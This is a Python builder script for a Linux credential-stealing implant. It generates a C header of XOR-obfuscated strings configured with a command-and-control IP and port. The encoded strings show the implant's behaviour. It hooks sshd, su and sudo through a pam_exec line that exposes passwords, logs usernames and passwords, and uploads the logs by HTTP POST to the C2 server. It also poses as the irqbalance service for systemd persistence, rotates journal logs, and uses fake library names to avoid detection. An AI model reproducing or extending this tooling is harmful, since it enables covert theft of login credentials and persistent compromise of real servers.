#!/usr/bin/env python3
import sys
import os
import secrets

XOR_KEY = [0x5A, 0x3C, 0x7F, 0x1B, 0xAE, 0xD2, 0x44, 0x91]

def xor_encode(plaintext):
    if isinstance(plaintext, bytes):
        data = plaintext
    else:
        data = plaintext.encode('latin-1')
    return [b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)]

def emit_array(f, name, plaintext):
    enc = xor_encode(plaintext)
    length = len(enc)
    f.write(f"#define {name}_LEN {length}\n")
    f.write(f"static volatile const unsigned char {name}[] = {{{','.join(f'0x{b:02X}' for b in enc)}}};\n\n")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <C2_IP> <C2_PORT> [ENDPOINT]")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    endpoint = sys.argv[3] if len(sys.argv) > 3 and not sys.argv[3].startswith("--") else "/l"

    token_file = "auth_token.key"
    if "--new-token" not in sys.argv and os.path.exists(token_file):
        with open(token_file, "r") as tf:
            existing = tf.read().strip()
        if existing:
            auth_token = existing
            print(f"[*] Reusing existing auth token from {token_file}")
        else:
            auth_token = secrets.token_hex(16)
    else:
        auth_token = secrets.token_hex(16)

    with open("xor_config.h", "w") as f:
        f.write("#ifndef XOR_CONFIG_H\n#define XOR_CONFIG_H\n\n")
        f.write(f"#define XOR_KEY_LEN 8\n")
        f.write(f"static const unsigned char XOR_KEY[] = {{{','.join(f'0x{b:02X}' for b in XOR_KEY)}}};\n\n")

        f.write("__attribute__((noinline, optimize(\"O0\")))\n")
        f.write("static void xor_decode(char *out, const volatile unsigned char *enc, size_t len) {\n")
        f.write("    for (size_t i = 0; i < len; i++)\n")
        f.write("        out[i] = enc[i] ^ XOR_KEY[i % XOR_KEY_LEN];\n")
        f.write("    out[len] = '\\0';\n")
        f.write("}\n\n")

        f.write("__attribute__((noinline, optimize(\"O0\")))\n")
        f.write("static void xor_crypt(unsigned char *data, size_t len) {\n")
        f.write("    for (size_t i = 0; i < len; i++)\n")
        f.write("        data[i] ^= XOR_KEY[i % XOR_KEY_LEN];\n")
        f.write("}\n\n")


        emit_array(f, "C2_IP_ENC", ip)
        emit_array(f, "C2_PORT_ENC", port)
        emit_array(f, "OBF_ENDPOINT", endpoint)
        emit_array(f, "OBF_AUTH_TOKEN", auth_token)
        emit_array(f, "OBF_DNS_PROBE", "8.8.8.8")
        emit_array(f, "OBF_STOP", "stop")
        emit_array(f, "OBF_START", "start")
        emit_array(f, "OBF_DISABLE", "disable")


        emit_array(f, "OBF_WORKDIR", "/var/lib/irqbalance")                                                                                                            
        emit_array(f, "OBF_AUTH_BUF", "/var/lib/irqbalance/.cache")
        emit_array(f, "OBF_PAM_LINE", "auth optional pam_exec.so quiet expose_authtok %s")
        emit_array(f, "OBF_SVC_NAME", "irqbalance")
        emit_array(f, "OBF_SVC_FILE", "irqbalance.service")


        emit_array(f, "OBF_OS_RELEASE", "/etc/os-release")
        emit_array(f, "OBF_ID_PREFIX", "ID=")
        emit_array(f, "OBF_OS_UBUNTU", "ubuntu")
        emit_array(f, "OBF_OS_DEBIAN", "debian")
        emit_array(f, "OBF_OS_KALI", "kali")
        emit_array(f, "OBF_OS_PARROT", "parrot")
        emit_array(f, "OBF_OS_CENTOS", "centos")
        emit_array(f, "OBF_OS_RHEL", "rhel")
        emit_array(f, "OBF_OS_ROCKY", "rocky")
        emit_array(f, "OBF_OS_ALMA", "alma")
        emit_array(f, "OBF_OS_FEDORA", "fedora")


        emit_array(f, "OBF_PAM_DIR_DEB", "/lib/x86_64-linux-gnu/security")
        emit_array(f, "OBF_SYSTEMD_DIR_DEB", "/lib/systemd/system")
        emit_array(f, "OBF_TARGET_DIR_DEB", "/usr/sbin")
        emit_array(f, "OBF_PAM_DIR_RH", "/usr/lib64/security")
        emit_array(f, "OBF_SYSTEMD_DIR_RH", "/usr/lib/systemd/system")
        emit_array(f, "OBF_TARGET_DIR_RH", "/usr/sbin")
        emit_array(f, "OBF_PAM_DIR_FB", "/lib/security")
        emit_array(f, "OBF_SYSTEMD_DIR_FB", "/etc/systemd/system")
        emit_array(f, "OBF_TARGET_DIR_FB", "/usr/sbin")

        emit_array(f, "OBF_PAM_TYPE", "PAM_TYPE")
        emit_array(f, "OBF_PAM_USER", "PAM_USER")
        emit_array(f, "OBF_PAM_RHOST", "PAM_RHOST")

        emit_array(f, "OBF_COMMON_AUTH", "common-auth")
        emit_array(f, "OBF_SYSTEM_AUTH", "system-auth")

        emit_array(f, "OBF_MEMFD", "memfd:")

        emit_array(f, "OBF_PID_MAX_PATH", "/proc/sys/kernel/pid_max")

        emit_array(f, "OBF_PAM_SSHD", "/etc/pam.d/sshd")
        emit_array(f, "OBF_PAM_SU", "/etc/pam.d/su")
        emit_array(f, "OBF_PAM_SUDO", "/etc/pam.d/sudo")

        emit_array(f, "OBF_ORIG_BIN", ".orig_bin")
        emit_array(f, "OBF_ORIG_SVC", ".orig_svc")
        emit_array(f, "OBF_ENABLE", "enable")

        emit_array(f, "OBF_PROC_SELF", "/proc/self/exe")
        emit_array(f, "OBF_BIN_LS", "/bin/ls")
        emit_array(f, "OBF_DEV_NULL", "/dev/null")
        emit_array(f, "OBF_PROC_NAME", "irqbalance")
        emit_array(f, "OBF_UNKNOWN", "unknown")
        emit_array(f, "OBF_SSHD_SVC", "sshd.service")
        emit_array(f, "OBF_PATH_FMT", "%s/%s")

        emit_array(f, "OBF_FINAL_LOG_FMT", "%s_final.log")
        emit_array(f, "OBF_TIME_FMT", "%y%m%d%H")
        emit_array(f, "OBF_EXFIL_FMT", "%s_%s_%s.log")

        emit_array(f, "OBF_BOUNDARY", "----B7xF9kQ2mW4pR1")
        emit_array(f, "OBF_HTTP_BODY_PFX",
            "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n")
        emit_array(f, "OBF_HTTP_BODY_SFX", "\r\n--%s--\r\n")
        emit_array(f, "OBF_HTTP_HEADERS",
            "POST %s HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: multipart/form-data; boundary=%s\r\nContent-Length: %zu\r\nX-Correlation-ID: %s\r\nConnection: close\r\n\r\n")
        emit_array(f, "OBF_HTTP_200", "200")

        emit_array(f, "OBF_LIB_DIR_DEB", "/lib/x86_64-linux-gnu/")
        emit_array(f, "OBF_LIB_DIR_RH", "/lib64/")
        emit_array(f, "OBF_FAKE_LIBC", "libc.so.6")
        emit_array(f, "OBF_FAKE_LIBCAPNG", "libcap-ng.so.0")
        emit_array(f, "OBF_FAKE_LIBGLIB", "libglib-2.0.so.0")
        emit_array(f, "OBF_FAKE_LIBNUMA", "libnuma.so.1")
        emit_array(f, "OBF_FAKE_LIBSYSTEMD", "libsystemd.so.0")
        emit_array(f, "OBF_FAKE_LDLINUX", "/lib64/ld-linux-x86-64.so.2")

        emit_array(f, "OBF_SVC_TEMPLATE",
            "[Unit]\nDescription=irqbalance daemon\n\n"
            "[Service]\nType=forking\nExecStart=%s\nRestart=on-failure\nRestartSec=5s\n"
            "StandardOutput=null\nStandardError=null\n\n[Install]\nWantedBy=multi-user.target\n")

        emit_array(f, "OBF_SYSTEMCTL_USR", "/usr/bin/systemctl")
        emit_array(f, "OBF_SYSTEMCTL_BIN", "/bin/systemctl")
        emit_array(f, "OBF_SYSTEMCTL", "systemctl")
        emit_array(f, "OBF_DAEMON_RELOAD", "daemon-reload")
        emit_array(f, "OBF_JOURNALCTL_USR", "/usr/bin/journalctl")
        emit_array(f, "OBF_JOURNALCTL", "journalctl")
        emit_array(f, "OBF_ROTATE", "--rotate")
        emit_array(f, "OBF_RESET_FAILED", "reset-failed")
        emit_array(f, "OBF_WANTS_DIR", "/etc/systemd/system/multi-user.target.wants")
        emit_array(f, "OBF_WANTS_LINK_FMT", "/etc/systemd/system/multi-user.target.wants/%s")
        emit_array(f, "OBF_RUN_SYS_FMT", "/run/systemd/system/%s")
        emit_array(f, "OBF_RUN_TRANS_FMT", "/run/systemd/transient/%s")
        emit_array(f, "OBF_LOG_FMT", "User:%s Pass:%s Host:%s\n")
        emit_array(f, "OBF_LOCAL", "local")
        emit_array(f, "OBF_AUTH_PREFIX", "auth")

        f.write("#endif\n")

    with open("auth_token.key", "w") as f:
        f.write(auth_token + "\n")

    print(f"[+] Generated xor_config.h for {ip}:{port}")
    print(f"[+] Auth token: {auth_token}")
    print(f"[+] Token saved to auth_token.key")

if __name__ == "__main__":
    main()
